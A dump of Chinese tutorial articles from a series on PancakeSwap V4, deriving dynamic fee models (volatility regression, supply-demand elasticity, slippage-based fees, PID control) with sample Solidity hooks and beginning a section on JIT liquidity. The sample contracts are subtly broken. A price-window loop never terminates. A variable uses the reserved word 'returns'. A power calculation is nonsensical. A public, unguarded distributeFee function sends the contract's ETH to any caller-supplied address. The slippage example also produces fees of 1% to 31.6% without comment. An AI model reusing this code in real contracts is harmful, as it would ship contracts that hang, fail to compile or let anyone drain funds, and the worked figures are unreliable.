读取Singleton状态：~2,100 gas\n- 查询池子数据：~2,100 gas\n- 记录初始余额：~2 × 810 = ~1,620 gas\n- 计算swap：~8,000 gas\n- 记录最终余额：~2 × 810 = ~1,620 gas\n- 结算转账：~15,000 gas\n- 更新状态：~4,000 gas\n- 返回：~2,000 gas\n总计：~36,440 gas\n\n单次swap可能略高，但考虑：\n1. 代码复用和优化\n2. 批量操作节省\n3. 减少合约调用\n\n创建池子优化\nV3创建池子:\n- 部署池合约：~2,000,000 gas\n- 初始化：~150,000 gas\n总计：~2,150,000 gas\n\nV4创建池子:\n- 在Singleton中添加记录：~50,000 gas\n- 初始化池数据：~100,000 gas\n总计：~150,000 gas\n\n节省：~2,000,000 gas (93%)\n\n3.2 存储优化总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n指标V3V4优化池子存储N × 10050 + N × 2080%部署GasN × 2M1M + N × 150K92.5%创建池子2.15M150K93%Swap Gas33K36K优化逻辑维护成本N个合约1个合约显著降低\n\n4. 本章小结\n4.1 Singleton核心要点\nmindmap\n  root((Singleton架构))\n    存储优化\n      共享基础数据\n      差异数据\n      存储槽数量减少80%\n    Gas优化\n      部署成本降低92.5%\n      创建池子降低93%\n      代码复用\n    维护优化\n      单一合约\n      统一升级\n      集中管理\n    数学证明\n      存储节省定理\n      成本优化定理\n\n4.2 Flash Accounting核心要点\nmindmap\n  root((Flash Accounting))\n    核心机制\n      延迟转账\n      批量结算\n      余额追踪\n    Gas节省\n      减少转账次数\n      查询代替转账\n      优化约40%\n    安全性\n      余额检查\n      异常检测\n      防止溢出\n    数学证明\n      Gas节省定理\n      安全性定理\n\n4.3 关键公式速查\n存储节省：\nRatio = 1 - P/M - S/(N×M)\n当 N→∞: Ratio → 1 - P/M\n\n部署成本：\nGas_V4 &lt; Gas_V3\n当 Gas_deploy_V4_singleton &lt; N × (Gas_deploy_V3_pool - Gas_deploy_V4_pool)\n\nFlash Accounting Gas节省：\nRatio ≈ 0.5 - k\n其中 k = G_balance / G_transfer\n\n余额检查：\nB_i(T) ≥ B_i^tracked(0)\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨费用系统的数学推导，包括：\n\n动态费用模型的数学原理\n基于波动率的费用计算\n基于供需的费用调整\nHooks实现的费用优化\n\n\n参考资料\n\nPancakeSwap V4 Core 源码\nUniswap V4 Flash Accounting 提案\nGas优化最佳实践\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/04-费用系统的数学推导":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/04-费用系统的数学推导","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/04-费用系统的数学推导.md","title":"04-费用系统的数学推导","links":[],"tags":[],"content":"死磕PancakeSwap V4（四）：费用系统的数学推导\n\n本文是「死磕PancakeSwap V4」系列的第四篇，深入剖析V4费用系统的数学模型、动态费用推导和计算实例。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. 费用系统概述\n1.1 V3固定费用的问题\n问题1：静态费用无法适应市场\n数学表述：\n设费用率为fee（常数），市场波动率为σ(t)，流动性为L(t)。\n问题：fee = constant\n期望：fee = f(σ(t), L(t), t)\n\n示例分析：\n场景1：高波动时期\nσ(t) = 50%（日波动率）\nL(t) = 10,000,000 USDT（流动性不足）\nfee = 0.3%（固定）\n\n问题：费用过低，无法补偿LP的波动风险\n\n场景2：低波动稳定币对\nσ(t) = 0.1%（日波动率）\nL(t) = 100,000,000 USDT（充足流动性）\nfee = 0.3%（固定）\n\n问题：费用过高，降低交易效率\n\n问题2：无法优化LP收益\nLP收益模型：\nLP收益 = fee × V - impermanent_loss\n\n其中：\n- V: 交易量\n- impermanent_loss: 无常损失\n\n期望：\nmaximize: fee × V - IL\nsubject to: fee在合理范围内\n\n固定费用无法达到最优。\n1.2 V4动态费用系统\ngraph TB\n    subgraph DynamicFeeSystem[&quot;动态费用系统&quot;]\n        F1[市场状态监测]\n        F2[费用模型计算]\n        F3[费用调整]\n        F4[Hooks应用]\n    end\n\n    subgraph Inputs[&quot;输入参数&quot;]\n        I1[波动率 σ]\n        I2[交易量 V]\n        I3[流动性 L]\n        I4[时间 t]\n    end\n\n    subgraph Outputs[&quot;输出&quot;]\n        O1[动态费用 fee]\n        O2[预期收益]\n        O3[风险调整]\n    end\n\n    Inputs --&gt; F1\n    F1 --&gt; F2\n    F2 --&gt; F3\n    F3 --&gt; F4\n    F4 --&gt; Outputs\n\n    style DynamicFeeSystem fill:#ffeb3b\n\n\n2. 动态费用数学模型\n2.1 基于波动率的费用模型\n模型定义\n价格波动率：\n日收益率：\nr_t = ln(P_t / P_{t-1})\n\n平均收益率：\nμ = (1/n) × Σ r_t\n\n波动率（标准差）：\nσ = sqrt((1/n) × Σ (r_t - μ)²)\n\n动态费用函数：\nfee(t) = α × σ(t)^β + fee_base\n\n其中：\n- α: 敏感度参数（α &gt; 0）\n- β: 弹性系数（β ≥ 1）\n- σ(t): t时刻的波动率\n- fee_base: 基础费用（fee_base &gt; 0）\n\n参数确定\n最小二乘回归：\n给定历史数据 {(σ_i, fee_i)}，i=1..n\n目标：最小化误差平方和\nminimize: J(α, β, fee_base) = Σ [fee_i - (α × σ_i^β + fee_base)]²\n\n约束条件：\n    α &gt; 0\n    β ≥ 1\n    fee_base &gt; 0\n    0 &lt; fee(t) &lt; 1  （费用率0-100%）\n\n求解方法：\n\n固定β和fee_base，求解α：\n\n∂J/∂α = 0\n⇒ -2 × Σ (fee_i - (α × σ_i^β + fee_base)) × σ_i^β = 0\n⇒ Σ (fee_i × σ_i^β) - α × Σ σ_i^{2β} - fee_base × Σ σ_i^β = 0\n⇒ α = [Σ (fee_i × σ_i^β) - fee_base × Σ σ_i^β] / Σ σ_i^{2β}\n\n\n使用网格搜索或梯度下降优化β和fee_base\n\n计算实例\n步骤1：收集历史数据\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n时间日波动率σ历史费用feeDay 12.5%0.30%Day 25.0%0.45%Day 31.0%0.25%Day 43.0%0.35%Day 510.0%0.60%\n步骤2：计算平均值\nμ_σ = (2.5 + 5.0 + 1.0 + 3.0 + 10.0) / 5 = 4.3%\nμ_fee = (0.30 + 0.45 + 0.25 + 0.35 + 0.60) / 5 = 0.39%\n\n步骤3：线性回归（假设β=1）\n设模型：fee = α × σ + fee_base\n使用最小二乘法：\nΣ σ = 21.5\nΣ fee = 1.95\nΣ σ² = 2.5² + 5.0² + 1.0² + 3.0² + 10.0²\n      = 6.25 + 25.0 + 1.0 + 9.0 + 100.0\n      = 141.25\nΣ σ × fee = 2.5×0.30 + 5.0×0.45 + 1.0×0.25 + 3.0×0.35 + 10.0×0.60\n          = 0.75 + 2.25 + 0.25 + 1.05 + 6.00\n          = 10.30\n\n计算α和fee_base：\nn = 5\n\nα = [n × Σ(σ × fee) - Σσ × Σfee] / [n × Σσ² - (Σσ)²]\n  = [5 × 10.30 - 21.5 × 1.95] / [5 × 141.25 - 21.5²]\n  = [51.5 - 41.925] / [706.25 - 462.25]\n  = 9.575 / 244.0\n  = 0.0393\n\nfee_base = (Σfee - α × Σσ) / n\n         = (1.95 - 0.0393 × 21.5) / 5\n         = (1.95 - 0.845) / 5\n         = 1.105 / 5\n         = 0.221\n         = 0.221%\n\n步骤4：验证模型\n预测Day 6（假设σ=4.0%）：\nfee = 0.0393 × 4.0 + 0.221\n    = 0.1572 + 0.221\n    = 0.3782\n    ≈ 0.38%\n\n高阶模型（β&gt;1）\n设β=2，模型：fee = α × σ² + fee_base\n计算：\nσ²数据：\nDay 1: 2.5² = 6.25\nDay 2: 5.0² = 25.0\nDay 3: 1.0² = 1.0\nDay 4: 3.0² = 9.0\nDay 5: 10.0² = 100.0\n\nΣ σ² = 141.25\nΣ σ⁴ = 6.25² + 25.0² + 1.0² + 9.0² + 100.0²\n      = 39.0625 + 625.0 + 1.0 + 81.0 + 10000.0\n      = 10746.0625\nΣ σ² × fee = 6.25×0.30 + 25.0×0.45 + 1.0×0.25 + 9.0×0.35 + 100.0×0.60\n          = 1.875 + 11.25 + 0.25 + 3.15 + 60.0\n          = 76.525\n\n计算α和fee_base：\nα = [n × Σ(σ² × fee) - Σσ² × Σfee] / [n × Σσ⁴ - (Σσ²)²]\n  = [5 × 76.525 - 141.25 × 1.95] / [5 × 10746.0625 - 141.25²]\n  = [382.625 - 275.4375] / [53730.3125 - 19951.5625]\n  = 107.1875 / 33778.75\n  = 0.00317\n\nfee_base = (Σfee - α × Σσ²) / n\n         = (1.95 - 0.00317 × 141.25) / 5\n         = (1.95 - 0.4478) / 5\n         = 1.5022 / 5\n         = 0.3004\n         = 0.30%\n\n模型：fee = 0.00317 × σ² + 0.30%\n预测Day 6（σ=4.0%）：\nfee = 0.00317 × 16 + 0.30\n    = 0.0507 + 0.30\n    = 0.3507\n    ≈ 0.35%\n\n2.2 基于供需的费用模型\n模型定义\n供需比：\n需求 D(t): 单位时间内的交易量\n供给 S(t): 总流动性\n\n供需比 R(t) = D(t) / S(t)\n\n动态费用：\nfee(t) = fee_base × R(t)^k\n\n其中：\n- fee_base: 基础费用\n- k: 弹性系数（k &gt; 0）\n- R(t): t时刻的供需比\n\n弹性系数分析\nk=1（线性弹性）：\nfee(t) = fee_base × D(t) / S(t)\n\n特点：\n- 费用与供需比成正比\n- 简单直观\n- 适合一般情况\n\nk&gt;1（高弹性）：\nfee(t) = fee_base × (D(t) / S(t))^k\n\n特点：\n- 高需求时费用快速上升\n- 抑制过度交易\n- 适合高波动市场\n\n0&lt;k&lt;1（低弹性）：\nfee(t) = fee_base × (D(t) / S(t))^k\n\n特点：\n- 费用变化平缓\n- 稳定交易环境\n- 适合稳定币对\n\n数学性质\n定理1：单调性\n命题：当k&gt;0时，fee(t)随D(t)单调递增，随S(t)单调递减。\n证明：\n∂fee/∂D = fee_base × k × D(t)^{k-1} / S(t)^k\n\n因为 fee_base &gt; 0, k &gt; 0, D(t) &gt; 0, S(t) &gt; 0\n\n所以 ∂fee/∂D &gt; 0\n\n同理：\n\n∂fee/∂S = fee_base × (-k) × D(t)^k / S(t)^{k+1}\n        = -fee_base × k × D(t)^k / S(t)^{k+1}\n\n因为 fee_base &gt; 0, k &gt; 0, D(t) &gt; 0, S(t) &gt; 0\n\n所以 ∂fee/∂S &lt; 0\n\n证毕。\n\n定理2：凸凹性\n命题：当k&gt;1时，fee(t)是D(t)的凸函数；当0&lt;k&lt;1时，fee(t)是D(t)的凹函数。\n证明：\n计算二阶导数：\n\n∂²fee/∂D² = fee_base × k × (k-1) × D(t)^{k-2} / S(t)^k\n\n当 k &gt; 1:\n   k × (k-1) &gt; 0\n   所以 ∂²fee/∂D² &gt; 0\n   fee(t)是D(t)的凸函数\n\n当 0 &lt; k &lt; 1:\n   k × (k-1) &lt; 0\n   所以 ∂²fee/∂D² &lt; 0\n   fee(t)是D(t)的凹函数\n\n当 k = 1:\n   k × (k-1) = 0\n   所以 ∂²fee/∂D² = 0\n   fee(t)是D(t)的线性函数\n\n证毕。\n\n计算实例\n场景设置：\nfee_base = 0.3% = 0.003\nk = 1.2\n\n数据：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n时间交易量D (USDT)流动性S (USDT)供需比R = D/S00:00100,00010,000,0000.0106:00500,00010,000,0000.0512:002,000,00010,000,0000.2018:005,000,00010,000,0000.50\n计算动态费用：\n00:00:\nfee = 0.003 × 0.01^{1.2}\n    = 0.003 × 0.0063\n    = 0.0000189\n    = 0.00189%\n\n06:00:\nfee = 0.003 × 0.05^{1.2}\n    = 0.003 × 0.0314\n    = 0.0000942\n    = 0.00942%\n\n12:00:\nfee = 0.003 × 0.20^{1.2}\n    = 0.003 × 0.1094\n    = 0.0003282\n    = 0.03282%\n\n18:00:\nfee = 0.003 × 0.50^{1.2}\n    = 0.003 × 0.3789\n    = 0.0011367\n    = 0.11367%\n\n可视化：\n费用曲线：\n0.11367% |                       *\n         |                   *\n         |              *\n         |         *\n         |    *\n0.00189% |*\n         +--------------------------------\n         00:00  06:00  12:00  18:00\n\n2.3 基于流动性的费用模型\n模型定义\n流动性深度：\n滑点 = f(Δx, L) = f_trade_amount / f_liquidity\n\n简化模型：\nslip = Δx / L\n\n动态费用：\nfee(t) = f(slip(t)) = slip(t)^γ\n\n其中：\n- slip(t): t时刻的预期滑点\n- γ: 滑点敏感度（γ &gt; 0）\n\n滑点-费用关系\n定理3：费用与滑点正相关\n命题：当γ&gt;0时，费用随滑点单调递增。\n证明：\nfee = slip^γ\n∂fee/∂slip = γ × slip^{γ-1}\n\n因为 γ &gt; 0, slip &gt; 0\n\n所以 ∂fee/∂slip &gt; 0\n\n证毕。\n\n计算实例\n参数设置：\nγ = 0.5（中等敏感度）\n\n场景1：小额交易（高流动性）\nΔx = 1,000 USDT\nL = 10,000,000 USDT\n\nslip = 1,000 / 10,000,000 = 0.0001 = 0.01%\n\nfee = 0.0001^{0.5}\n    = 0.01\n    = 1.0%\n\n场景2：中额交易\nΔx = 100,000 USDT\nL = 10,000,000 USDT\n\nslip = 100,000 / 10,000,000 = 0.01 = 1.0%\n\nfee = 0.01^{0.5}\n    = 0.1\n    = 10.0%\n\n场景3：大额交易\nΔx = 1,000,000 USDT\nL = 10,000,000 USDT\n\nslip = 1,000,000 / 10,000,000 = 0.10 = 10.0%\n\nfee = 0.10^{0.5}\n    = 0.316\n    = 31.6%\n\n\n3. 费用分配数学\n3.1 费用分配模型\n总费用：\nfee_total = fee_input + fee_output\n\n其中：\n- fee_input: 输入代币的费用\n- fee_output: 输出代币的费用（如果适用）\n\n分配结构：\nfee_total = fee_lp + fee_protocol + fee_hook\n\n其中：\n- fee_lp: 分配给LP\n- fee_protocol: 协议费用\n- fee_hook: Hook费用（如果设置）\n\n3.2 LP费用分配\n按流动性分配：\n设有N个LP，第i个LP的流动性为L_i，总流动性为L_total = Σ L_i\nfee_lp_i = fee_lp × (L_i / L_total)\n\n验证：\nΣ fee_lp_i = Σ [fee_lp × (L_i / L_total)]\n          = fee_lp × Σ (L_i / L_total)\n          = fee_lp × (Σ L_i / L_total)\n          = fee_lp × (L_total / L_total)\n          = fee_lp\n\n✓ 所有LP的费用之和等于总LP费用\n\n3.3 Hook费用分配\nHook费用计算：\nfee_hook = fee_total × hook_rate\n\n其中：\n- hook_rate: Hook费率（由Hook设置）\n- 0 ≤ hook_rate ≤ 1\n\n代码实现：\ncontract DynamicFeeHook {\n    // 基础费率\n    uint256 public constant BASE_FEE = 300;  // 0.03%\n \n    // Hook费率\n    uint256 public hookRate = 1000;  // 10% of fees\n \n    // 挂钩（动态）费率\n    uint256 public dynamicFeeRate = 5000;  // 0.5%\n \n    function calculateFee(\n        uint256 amountIn,\n        uint256 volatility,\n        uint256 liquidity\n    ) public pure returns (uint256) {\n        // 基础费用\n        uint256 baseFee = (amountIn * BASE_FEE) / 1e6;\n \n        // 动态费用调整\n        uint256 dynamicFee = (amountIn * dynamicFeeRate) / 1e6;\n \n        // 总费用\n        uint256 totalFee = baseFee + dynamicFee;\n \n        return totalFee;\n    }\n \n    function distributeFee(\n        uint256 totalFee,\n        address liquidityProvider,\n        address protocol\n    ) public {\n        // Hook费用\n        uint256 hookFee = (totalFee * hookRate) / 10000;\n \n        // 协议费用（假设20%）\n        uint256 protocolFee = (totalFee * 2000) / 10000;\n \n        // LP费用\n        uint256 lpFee = totalFee - hookFee - protocolFee;\n \n        // 分配\n        payable(protocol).transfer(protocolFee);\n        payable(liquidityProvider).transfer(lpFee);\n    }\n}\n\n4. 动态费用的Hook实现\n4.1 波动率计算Hook\ncontract VolatilityFeeHook {\n    // 历史价格数据\n    struct PricePoint {\n        uint256 price;\n        uint256 timestamp;\n    }\n \n    PricePoint[] public priceHistory;\n    uint256 public constant WINDOW_SIZE = 3600;  // 1小时窗口\n \n    // 费用参数\n    uint256 public alpha = 393;  // 0.0393% per 1% volatility\n    uint256 public feeBase = 221;  // 0.221%\n    uint256 public beta = 1;  // 线性\n \n    function updatePrice(uint256 price) external {\n        priceHistory.push(PricePoint({\n            price: price,\n            timestamp: block.timestamp\n        }));\n \n        // 清理过期数据\n        while (\n            priceHistory.length &gt; 0 &amp;&amp;\n            block.timestamp - priceHistory[0].timestamp &gt; WINDOW_SIZE\n        ) {\n            // 移除最旧的价格点（在实现中应该使用更高效的方法）\n        }\n    }\n \n    function calculateVolatility() public view returns (uint256) {\n        if (priceHistory.length &lt; 2) {\n            return 0;  // 数据不足\n        }\n \n        // 计算收益率\n        uint256[] memory returns = new uint256[](priceHistory.length - 1);\n        uint256 sumReturns = 0;\n \n        for (uint256 i = 1; i &lt; priceHistory.length; i++) {\n            uint256 r = (priceHistory[i].price * 1e18) / priceHistory[i-1].price;\n            returns[i-1] = r;\n            sumReturns += r;\n        }\n \n        // 平均收益率\n        uint256 mean = sumReturns / (priceHistory.length - 1);\n \n        // 计算方差\n        uint256 variance = 0;\n        for (uint256 i = 0; i &lt; returns.length; i++) {\n            int256 diff = int256(returns[i]) - int256(mean);\n            variance += uint256(diff * diff);\n        }\n \n        variance = variance / returns.length;\n \n        // 波动率（标准差）\n        uint256 volatility = sqrt(variance);\n \n        // 转换为百分比（假设price在1e18精度）\n        return volatility / 1e16;  // 转换为%\n    }\n \n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external view returns (bytes memory) {\n        // 计算当前价格\n        uint256 currentPrice = uint256(sqrtPriceLimitX96) ** 2 &gt;&gt; 192;\n \n        // 计算波动率\n        uint256 volatility = calculateVolatility();\n \n        // 计算动态费用\n        uint256 dynamicFee = calculateDynamicFee(volatility);\n \n        return abi.encode(dynamicFee);\n    }\n \n    function calculateDynamicFee(uint256 volatility) public view returns (uint256) {\n        // 线性模型：fee = α × σ + fee_base\n        uint256 fee = (alpha * volatility / 100) + feeBase;\n \n        // 限制费用范围\n        fee = max(fee, 100);     // 最小0.01%\n        fee = min(fee, 10000);   // 最大1.00%\n \n        return fee;\n    }\n \n    function sqrt(uint256 x) internal pure returns (uint256) {\n        if (x == 0) return 0;\n        uint256 z = (x + 1) / 2;\n        uint256 y = x;\n        while (z &lt; y) {\n            y = z;\n            z = (x / z + 1) / 2;\n        }\n        return y;\n    }\n \n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &gt;= b ? a : b;\n    }\n \n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &lt;= b ? a : b;\n    }\n}\n4.2 供需模型Hook\ncontract SupplyDemandFeeHook {\n    // 基础费率\n    uint256 public constant BASE_FEE = 300;  // 0.03%\n \n    // 弹性系数\n    uint256 public k = 12;  // 1.2 (扩大100倍以避免浮点数）\n \n    // 时间窗口\n    uint256 public constant TIME_WINDOW = 3600;  // 1小时\n \n    // 历史数据\n    struct DataPoint {\n        uint256 volume;      // 交易量\n        uint256 liquidity;   // 流动性\n        uint256 timestamp;\n    }\n \n    DataPoint[] public history;\n \n    function recordData(uint256 volume, uint256 liquidity) external {\n        history.push(DataPoint({\n            volume: volume,\n            liquidity: liquidity,\n            timestamp: block.timestamp\n        }));\n \n        // 清理过期数据\n        // （实际实现应该使用更高效的方法）\n    }\n \n    function getSupplyDemandRatio() public view returns (uint256) {\n        if (history.length == 0) {\n            return 0;\n        }\n \n        // 计算窗口内的总量\n        uint256 totalVolume = 0;\n        uint256 avgLiquidity = 0;\n \n        uint256 validCount = 0;\n        for (uint256 i = 0; i &lt; history.length; i++) {\n            if (block.timestamp - history[i].timestamp &lt;= TIME_WINDOW) {\n                totalVolume += history[i].volume;\n                avgLiquidity += history[i].liquidity;\n                validCount++;\n            }\n        }\n \n        if (validCount == 0) {\n            return 0;\n        }\n \n        avgLiquidity = avgLiquidity / validCount;\n \n        // 供需比（放大1e18以保持精度）\n        if (avgLiquidity == 0) {\n            return 0;\n        }\n \n        return (totalVolume * 1e18) / avgLiquidity;\n    }\n \n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external view returns (bytes memory) {\n        // 获取供需比\n        uint256 ratio = getSupplyDemandRatio();\n \n        // 计算动态费用\n        uint256 dynamicFee = calculateDynamicFee(ratio);\n \n        return abi.encode(dynamicFee);\n    }\n \n    function calculateDynamicFee(uint256 ratio) public view returns (uint256) {\n        // 模型：fee = base_fee × (D/S)^k\n        // 其中 ratio = (D/S) × 1e18\n \n        // 计算 (D/S)^k\n        // 使用对数近似：ln(x^k) = k × ln(x)\n        // 然后使用e^ln(x^k) = x^k\n \n        // 简化实现（假设ratio在合理范围内）\n        // 使用整数幂计算\n        uint256 exponent = 12;  // 1.2\n        uint256 base = ratio / 1e18;  // 去除精度\n \n        // 简化计算（应该使用更精确的幂函数）\n        uint256 power = base ** 12 / 1e20;  // 粗略近似\n \n        // 费用 = base_fee × power\n        uint256 fee = (BASE_FEE * power) / 1e18;\n \n        // 限制范围\n        fee = max(fee, 100);     // 最小0.01%\n        fee = min(fee, 10000);   // 最大1.00%\n \n        return fee;\n    }\n \n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &gt;= b ? a : b;\n    }\n \n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &lt;= b ? a : b;\n    }\n}\n\n5. 费用优化策略\n5.1 LP收益最大化\n优化问题：\nmaximize: E[LP收益]\n        = E[fee × V - IL]\n\n其中：\n- fee: 费用率\n- V: 交易量\n- IL: 无常损失\n\nsubject to:\n    0 &lt; fee &lt; 1\n    fee = f(σ, D, L)\n\n5.2 费用调整算法\nPID控制器：\nerror(t) = V_target - V_actual  （交易量偏差）\n\nΔfee(t) = Kp × error(t) + Ki × Σ error + Kd × (error(t) - error(t-1))\n\nfee(t) = fee(t-1) + Δfee(t)\n\n其中：\n- Kp: 比例系数\n- Ki: 积分系数\n- Kd: 微分系数\n\n代码实现：\ncontract PIDFeeController {\n    // PID参数\n    int256 public Kp = 100;   // 比例\n    int256 public Ki = 10;    // 积分\n    int256 public Kd = 5;     // 微分\n \n    // 状态变量\n    int256 public integralError;\n    int256 public lastError;\n \n    // 当前费用\n    uint256 public currentFee = 300;  // 0.03%\n \n    function updateFee(uint256 targetVolume, uint256 actualVolume) external {\n        // 计算误差\n        int256 error = int256(targetVolume) - int256(actualVolume);\n \n        // PID计算\n        int256 P = Kp * error / 1000;  // 比例项\n        integralError += error;         // 积分累积\n        int256 I = Ki * integralError / 1000;  // 积分项\n \n        int256 D = 0;\n        if (lastError != 0) {\n            D = Kd * (error - lastError) / 1000;  // 微分项\n        }\n \n        // 总调整\n        int256 deltaFee = P + I + D;\n \n        // 更新费用\n        int256 newFee = int256(currentFee) + deltaFee;\n \n        // 限制范围\n        if (newFee &lt; 100) newFee = 100;       // 最小0.01%\n        if (newFee &gt; 10000) newFee = 10000;  // 最大1.00%\n \n        currentFee = uint256(newFee);\n        lastError = error;\n    }\n}\n\n6. 本章小结\n6.1 动态费用模型总结\nmindmap\n  root((动态费用模型))\n    基于波动率\n      线性模型 β=1\n      高阶模型 β&gt;1\n      回归分析确定参数\n    基于供需\n      线性弹性 k=1\n      高弹性 k&gt;1\n      低弹性 0&lt;k&lt;1\n    基于流动性\n      滑点-费用关系\n      单调递增\n      凸凹性分析\n    数学性质\n      单调性证明\n      凸凹性证明\n      收益优化\n\n6.2 关键公式速查\n基于波动率：\nfee = α × σ^β + fee_base\n\n基于供需：\nfee = fee_base × (D/S)^k\n\n基于流动性：\nfee = slip^γ\n\nPID控制：\nΔfee = Kp × error + Ki × Σ error + Kd × Δerror\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨动态流动性机制，包括：\n\nJIT流动性的数学建模\n流动性分配优化\n动态再平衡策略\n实际代码实现\n\n\n参考资料\n\nPancakeSwap V4 费用模型文档\nAMM费用优化论文\n动态定价理论\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/05-动态流动性机制":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/05-动态流动性机制","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/05-动态流动性机制.md","title":"05-动态流动性机制","links":[],"tags":[],"content":"死磕PancakeSwap V4（五）：动态流动性机制\n\n本文是「死磕PancakeSwap V4」系列的第五篇，深入剖析动态流动性的数学建模、JIT机制和优化策略。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. 动态流动性概述\n1.1 传统流动性的问题\n问题1：流动性不匹配\n数学表述：\n设：\n\nL_i(t): t时刻价格区间i的流动性\nP(t): t时刻的价格\nV(t): t时刻的交易量\n\n传统AMM问题：\nL_i(t) 是固定的\n但 P(t) 和 V(t) 是动态的\n\n导致：\nΣ L_i(t) ≠ optimal L_optimal(P(t), V(t))\n\n示例：\ngraph TB\n    subgraph PriceMovement[&quot;价格变化&quot;]\n        P1[T1: 1800 USDT]\n        P2[T2: 2000 USDT]\n        P3[T3: 2200 USDT]\n    end\n\n    subgraph StaticLiquidity[&quot;静态流动性分配&quot;]\n        L1[区间[1700,1900]: L=1000]\n        L2[区间[1900,2100]: L=500]\n        L3[区间[2100,2300]: L=1000]\n    end\n\n    subgraph Problem[&quot;问题&quot;]\n        M1[T1: L1活跃&lt;br/&gt;L2, L3闲置]\n        M2[T2: L1, L2活跃&lt;br/&gt;L3闲置]\n        M3[T3: L3活跃&lt;br/&gt;L1, L2闲置]\n        R[效率低下&lt;br/&gt;30%流动性闲置]\n    end\n\n    PriceMovement --&gt; StaticLiquidity --&gt; Problem\n\n    style Problem fill:#ffcdd2\n\n1.2 动态流动性目标\n优化目标：\nmaximize: E[Return(L(t))]\n        = E[fee × V(t) - Impermanent_Loss]\n\nwhere:\n- fee(t): 动态费用\n- V(t): 交易量\n- Impermanent_Loss: 无常损失\n\nsubject to:\n    Σ L_i(t) = L_total  （总流动性约束）\n    L_i(t) ≥ 0  （非负约束）\n    L_i(t) 连续  （流动性连续性）\n\n1.3 动态流动性类型\nmindmap\n  root((动态流动性))\n    JIT流动性\n      Just-In-Time\n      临时添加\n      赚取费用\n    再平衡\n      定期调整\n      基于信号\n      最优分配\n    策略流动性\n      范围订单\n      DCA策略\n      对冲策略\n    自动化\n      触发条件\n      自动执行\n      节省人工\n\n\n2. JIT (Just-In-Time) 流动性机制\n2.1 JIT原理\n定义\nJIT流动性：在交易发生前临时添加流动性，交易后立即移除。\n数学模型：\n时刻t₀: L = 0\n时刻t₁: 添加流动性 L\n时刻t₂: 发生交易，赚取费用 fee\n时刻t₃: 移除流动性 L\n\n净收益 = fee - cost_add - cost_remove\n\n时机分析\n收益函数：\n设：\n\nL: 添加的流动性\nV: 交易量\nfee: 费用率\nP: 价格变化幅度\nt_duration: 流动性持续时间\n\nfee_earned = f(L, V, fee, P)\n           = L × fee × (ΔV / L)\n           = fee × ΔV\n\n其中：\n- ΔV: 实际影响的交易量\n\n成本函数：\ncost_total = cost_add + cost_remove\n\n其中：\n- cost_add: Gas成本（添加）\n- cost_remove: Gas成本（移除）\n\n假设：\ncost_add = cost_remove = C_gas\n\n则：\ncost_total = 2 × C_gas\n\n净收益：\nNet_Profit = fee × ΔV - 2 × C_gas\n\n有利条件：\nfee × ΔV &gt; 2 × C_gas\n\n2.2 JIT数学推导\n定理1：JIT有利条件\n定理：JIT有利当且仅当交易量超过阈值。\n证明：\n设定价滑点为slip，流动性为L\n\n交易前价格：P₀\n交易后价格：P₁\n滑点：slip = |P₁ - P₀| / P₀\n\n在V3/V4集中流动性模型中：\n\nΔV ≈ L × slip  （简化近似）\n\n费用收入：\nfee_earned = fee_rate × ΔV\n           = fee_rate × L × slip\n\n净收益：\nNet_Profit = fee_rate × L × slip - 2 × C_gas\n\n有利条件：\nNet_Profit &gt; 0\n⇔ fee_rate × L × slip - 2 × C_gas &gt; 0\n⇔ fee_rate × L × slip &gt; 2 × C_gas\n⇔ L × slip &gt; 2 × C_gas / fee_rate\n\n定义阈值：\nThreshold = 2 × C_gas / fee_rate\n\n因此：\nL × slip &gt; Threshold\n\n证毕。\n\n数值示例\n参数：\nfee_rate = 0.3% = 0.003\nC_gas = 0.05 ETH（添加/移除的gas成本）\nETH价格 = $2000\nC_gas_USD = 0.05 × 2000 = $100\n\nThreshold = 2 × $100 / 0.003 = 